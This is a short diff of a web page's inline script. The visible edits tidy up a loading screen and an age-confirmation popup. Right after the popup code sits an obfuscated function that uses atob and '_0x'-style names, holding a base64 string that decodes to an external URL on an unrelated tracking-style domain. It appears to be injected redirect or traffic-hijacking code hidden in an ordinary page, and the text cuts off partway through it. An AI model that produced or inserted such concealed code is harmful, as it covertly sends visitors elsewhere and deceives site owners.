@@ -270,24 +270,19 @@
   </div>
 
   <script>
-    window.addEventListener('DOMContentLoaded', () => {
-      const loader = document.getElementById('loader');
-      const container = document.getElementById('main-content');
-      const popup = document.getElementById('popup');
-  
+     window.addEventListener('DOMContentLoaded', () => {
       setTimeout(() => {
-        loader.classList.add('hidden');
-        container.style.visibility = 'visible';
-        popup.classList.add('active');
+        document.getElementById('loader').classList.add('hidden');
+        document.getElementById('main-content').style.visibility = 'visible';
+        document.getElementById('popup').classList.add('active');
         document.getElementById('overlay').classList.add('active');
-      }, 1000); // 1 секунда "загрузки"
+      }, 1500);
     });
-  
+
     function confirmAge() {
       document.getElementById('popup').classList.remove('active');
       document.getElementById('overlay').classList.remove('active');
-    }
-    ;(function () {
+    }(function () {
   const _0x32af0a = atob,
     _0x3ff128 = [
       'aHR0cHM6Ly9lNjNwOHI5LmZpbmRwYXJ0bmVydGhlZmluZGVyLmNvbS9waHEyYWduP3MxPXRyZWFkc190Z19sZW5k=',
